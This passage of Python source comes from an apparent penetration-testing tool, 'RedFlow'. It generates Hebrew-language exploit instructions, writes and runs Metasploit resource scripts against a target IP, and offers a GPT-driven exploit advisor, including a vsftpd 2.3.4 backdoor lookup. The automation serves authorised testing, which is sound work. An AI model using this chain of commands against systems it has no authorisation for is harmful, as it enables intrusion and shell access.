# תוצאה צפויה
אם ההרצה תצליח, סביר שתקבל shell או גישה למערכת היעד.

# פתרון בעיות
- אם מופיעה שגיאת Python, ודא שאתה משתמש ב-Python 3
- אם יש שגיאת חיבור, בדוק שהיעד זמין והפורט פתוח
- בדוק אם נדרשות תלויות נוספות עם `pip install -r requirements.txt`
"""

        # Handle Metasploit exploits
        elif exploit.file_ext.lower() == ".rb" and exploit.metasploit_path:
            return f"""
# ניתוח פגיעות

## מטרה
- **שירות**: {service_name} {version}
- **Exploit**: {exploit.title}
- **Metasploit Path**: {exploit.metasploit_path}

## ניתוח
מודול Metasploit זה עשוי להיות רלוונטי למערכת היעד. הניתוח בסיסי בלבד כיוון שלא חובר ל-GPT.

# הוראות הפעלה מדויקות

```bash
# הפעל את Metasploit Console
msfconsole -q

# שימוש במודול
use {exploit.metasploit_path}

# הגדרת פרמטרים
set RHOSTS TARGET_IP
set RPORT PORT_NUMBER
show options  # בדוק אם נדרשים פרמטרים נוספים

# הרצת המודול
exploit
```

# רצף פקודות אחד
```bash
msfconsole -q -x "use {exploit.metasploit_path}; set RHOSTS TARGET_IP; set RPORT PORT_NUMBER; exploit"
```

# תוצאה צפויה
אם ההרצה תצליח, סביר שתקבל meterpreter session או shell במערכת היעד.

# פתרון בעיות
- אם מופיעה שגיאה של פרמטרים חסרים, בדוק את הפרמטרים הנדרשים עם `show options`
- אם יש בעיות חיבור, ודא שהמערכת נגישה והפורטים פתוחים
- נסה להשתמש באפשרות `check` לפני הרצת ה-exploit כדי לבדוק אם המטרה פגיעה
"""
        
        # Generic fallback for other file types
        return f"""
# ניתוח פגיעות

## מטרה
- **שירות**: {service_name} {version}
- **Exploit**: {exploit.title}

## ניתוח
זהו ניתוח בסיסי שנוצר מכיוון שלא סופק מפתח API של GPT.

# הוראות הפעלה

1. הורד את ה-exploit:
   ```bash
   searchsploit -m {os.path.basename(exploit.path)}
   ```

2. הכן את ה-exploit להרצה (תלוי בסוג הקובץ):
   ```bash
   # עבור קבצי Python
   python3 {os.path.basename(exploit.path)} TARGET_IP PORT
   
   # עבור קבצי C
   gcc -o exploit {os.path.basename(exploit.path)} && ./exploit TARGET_IP PORT
   
   # עבור סקריפטים
   chmod +x {os.path.basename(exploit.path)} && ./{os.path.basename(exploit.path)}
   ```

3. אם זה מודול Metasploit:
   ```bash
   msfconsole -q
   use {exploit.metasploit_path or 'path/to/module'}
   set RHOSTS TARGET_IP
   set RPORT PORT_NUMBER
   exploit
   ```
   
# תוצאה צפויה
אם ההרצה תצליח, סביר שתקבל גישה למערכת היעד או מידע רגיש.

# פתרון בעיות
- בדוק שהיעד זמין ברשת
- ודא שאתה משתמש בגרסה הנכונה של התוכנה או השפה
- בדוק האם נדרשות הרשאות מיוחדות להרצת ה-exploit
"""

    def generate_metasploit_resource(self, metasploit_path: str, target_ip: str, port: int) -> str:
        """
        Generate a Metasploit resource script
        
        Args:
            metasploit_path: Path to Metasploit module
            target_ip: Target IP address
            port: Target port
            
        Returns:
            Path to generated resource script
        """
        self.logger.info(f"Generating Metasploit resource script for {metasploit_path}")
        
        # Create resource script content
        script_content = f"""use {metasploit_path}
set RHOSTS {target_ip}
set RPORT {port}
set LHOST 0.0.0.0
set LPORT 4444
show options
"""
        
        # Create a temporary file
        resource_file = os.path.join(self.config.output_dir, f"msf_{int(time.time())}.rc")
        
        try:
            with open(resource_file, 'w') as f:
                f.write(script_content)
            
            self.logger.info(f"Created Metasploit resource script at {resource_file}")
            return resource_file
        
        except Exception as e:
            self.logger.error(f"Error creating Metasploit resource script: {e}")
            return ""
    
    def run_metasploit_resource(self, resource_file: str) -> bool:
        """
        Run a Metasploit resource script
        
        Args:
            resource_file: Path to resource script
            
        Returns:
            True if successful, False otherwise
        """
        self.logger.info(f"Running Metasploit resource script {resource_file}")
        self.console.print(f"[bold cyan]Running Metasploit with resource script {resource_file}...[/bold cyan]")
        
        try:
            cmd = ["msfconsole", "-q", "-r", resource_file]
            
            # Run msfconsole
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            # Print output in real-time
            while True:
                output = process.stdout.readline()
                if not output and process.poll() is not None:
                    break
                if output:
                    self.console.print(output.strip())
            
            return process.returncode == 0
            
        except Exception as e:
            self.logger.error(f"Error running Metasploit: {e}")
            self.console.print(f"[bold red]Error running Metasploit: {e}[/bold red]")
            return False
    
    def interactive_exploit_advisor(self, target_services: List[Dict[str, Any]]) -> None:
        """
        Interactive exploit advisor for discovered services
        
        Args:
            target_services: List of discovered services with name, version, and port
        """
        self.logger.info("Starting interactive exploit advisor")
        self.console.print("\n[bold blue]======== RedFlow + GPT Exploit Advisor ========[/bold blue]")
        self.console.print("[bold blue]This feature suggests exploits based on detected services[/bold blue]\n")
        
        # Check if there are any services
        if not target_services:
            self.console.print("[bold yellow]No services detected. Run a scan first.[/bold yellow]")
            return
        
        # Import ExploitSuggester here to avoid circular imports
        from redflow.modules.gpt.exploit_suggester import ExploitSuggester
        
        # Determine the target IP - get it from config if available, otherwise from target_services
        target_ip = self.config.target if hasattr(self.config, "target") else None
        
        # Get specific port from environment or configuration if set
        specific_port = os.environ.get("REDFLOW_SPECIFIC_PORT", None) or \
                       (self.config.args.specific_port if hasattr(self.config, "args") and hasattr(self.config.args, "specific_port") else None)
                       
        # Filter services by specific port if set
        if specific_port:
            specific_port = str(specific_port)
            self.logger.info(f"Filtering services by port {specific_port}")
            filtered_services = [s for s in target_services if str(s.get("port", "")) == specific_port]
            
            if filtered_services:
                target_services = filtered_services
                self.console.print(f"[bold cyan]Focusing on port {specific_port} as requested[/bold cyan]")
            else:
                self.console.print(f"[bold yellow]Warning: No services found on specified port {specific_port}[/bold yellow]")
                self.console.print("[bold yellow]Showing all discovered services instead[/bold yellow]")
        
        # Convert services to target_info format expected by ExploitSuggester
        target_info = {
            "ip": target_ip or target_services[0].get("target", None) or os.environ.get("REDFLOW_TARGET", "127.0.0.1"),
            "domain": target_services[0].get("hostname", ""),
            "ports": {}
        }
        
        # Log the target IP we're using
        self.logger.info(f"Using target IP: {target_info['ip']} for exploit suggestions")
        
        # Convert services list to dictionary format for ExploitSuggester
        for service in target_services:
            port = service.get("port", "0")
            # Update service with target info if not present
            if "target" not in service and target_ip:
                service["target"] = target_ip
                
            target_info["ports"][port] = {
                "service": service.get("name", "unknown"),
                "version": service.get("version", "unknown"),
                "state": "open"
            }
        
        # Create ExploitSuggester and run the suggestion process
        suggester = ExploitSuggester(self.config, self.logger)
        suggested_exploits = suggester.suggest_exploits(target_info)
        
        # Ask if user wants detailed analysis for any exploit
        if suggested_exploits:
            self.console.print("\n[bold cyan]Do you want a detailed analysis for a specific exploit? (y/n)[/bold cyan]")
            detailed_analysis = input("> ").strip().lower().startswith("y")
            
            if detailed_analysis:
                # First, create a flat list of all services and exploits
                all_exploits = []
                for service_port, exploits in suggested_exploits.items():
                    service_name, port = service_port.split(":")
                    for exploit in exploits:
                        if "gpt_analysis" in exploit:
                            exploit_with_service = exploit.copy()
                            exploit_with_service["service"] = service_name
                            exploit_with_service["port"] = port
                            all_exploits.append(exploit_with_service)
                
                # Display available exploits with GPT analysis
                if all_exploits:
                    self.console.print("\n[bold green]Exploits with available GPT analysis:[/bold green]")
                    for i, exploit in enumerate(all_exploits, 1):
                        self.console.print(f"[{i}] {exploit['title']} ({exploit['service']} on port {exploit['port']})")
                    
                    # Ask user to select an exploit
                    self.console.print("\n[bold cyan]Select exploit for detailed analysis (number):[/bold cyan]")
                    exploit_selection = input("> ").strip()
                    
                    try:
                        exploit_idx = int(exploit_selection) - 1
                        if 0 <= exploit_idx < len(all_exploits):
                            selected_exploit = all_exploits[exploit_idx]
                            
                            # Show detailed analysis
                            self.console.print("\n[bold green]Detailed Analysis:[/bold green]")
                            self.display_advice(selected_exploit["gpt_analysis"])
                            
                            # Ask about running exploit with Metasploit
                            if selected_exploit.get("metasploit_path"):
                                self.console.print("\n[bold cyan]Do you want to run this exploit with Metasploit? (y/n)[/bold cyan]")
                                use_msf = input("> ").strip().lower().startswith("y")
                                
                                if use_msf:
                                    # Generate and run Metasploit resource script
                                    resource_file = self.generate_metasploit_resource(
                                        selected_exploit["metasploit_path"],
                                        target_info["ip"],
                                        int(selected_exploit["port"])
                                    )
                                    if resource_file:
                                        self.run_metasploit_resource(resource_file)
                        else:
                            self.console.print("[bold red]Invalid selection.[/bold red]")
                    except ValueError:
                        self.console.print("[bold red]Invalid selection.[/bold red]")
                else:
                    self.console.print("[bold yellow]No exploits with GPT analysis available.[/bold yellow]")
        
        self.console.print("\n[bold blue]GPT Exploit Advisor session completed[/bold blue]")
    
    def display_advice(self, advice: str) -> None:
        """
        Display formatted exploit advice from GPT
        
        Args:
            advice: Markdown-formatted advice from GPT
        """
        self.logger.info("Displaying exploit advice")
        
        try:
            # Convert markdown to rich markdown
            md = Markdown(advice)
            
            # Display in a nice panel
            self.console.print(
                Panel(
                    md,
                    title="[bold blue]GPT Vulnerability Analysis[/bold blue]",
                    border_style="blue",
                    expand=False
                )
            )
        except Exception as e:
            self.logger.error(f"Error displaying advice: {e}")
            # Fallback to plain text if markdown fails
            self.console.print("\n[bold blue]GPT Vulnerability Analysis:[/bold blue]")
            self.console.print(advice)

    def _search_exploits(self, query: str) -> List[ExploitInfo]:
        """
        Private method to search exploits for a query
        
        Args:
            query: Search query string
            
        Returns:
            List of ExploitInfo objects matching the query
        """
        results = []
        query_parts = query.lower().split()
        
        # Special case for vsftpd 2.3.4 - search for CVE-2011-2523
        if "vsftpd" in query.lower() and "2.3.4" in query:
            for exploit in self.cached_exploits:
                if exploit.cve and exploit.cve.lower() == "cve-2011-2523":
                    results.append(exploit)
                    self.logger.info(f"Found vsftpd 2.3.4 backdoor by CVE: {exploit.title}")
                elif exploit.title and "vsftpd 2.3.4" in exploit.title.lower() and "backdoor" in exploit.title.lower():
                    results.append(exploit)
                    self.logger.info(f"Found vsftpd 2.3.4 backdoor by title: {exploit.title}")
        
        # Regular search for all other cases
        for exploit in self.cached_exploits:
            # Skip if the exploit doesn't have any relevant fields
            if not exploit.title and not exploit.service:
                continue
            
            # Check if all parts of the query are in the title or description
            match_all_parts = True
            for part in query_parts:
                # Check various fields for match
                in_title = exploit.title and part in exploit.title.lower()
                in_service = exploit.service and part in exploit.service.lower()
                in_description = exploit.description and part in exploit.description.lower()
                
                if not (in_title or in_service or in_description):
                    match_all_parts = False
                    break
            
            if match_all_parts:
                # Skip duplicates (might happen with the vsftpd special case)
                if not any(r.path == exploit.path for r in results):
                    results.append(exploit)
                
                # Limit results to prevent performance issues
                if len(results) >= 100:
                    break
        
        return results 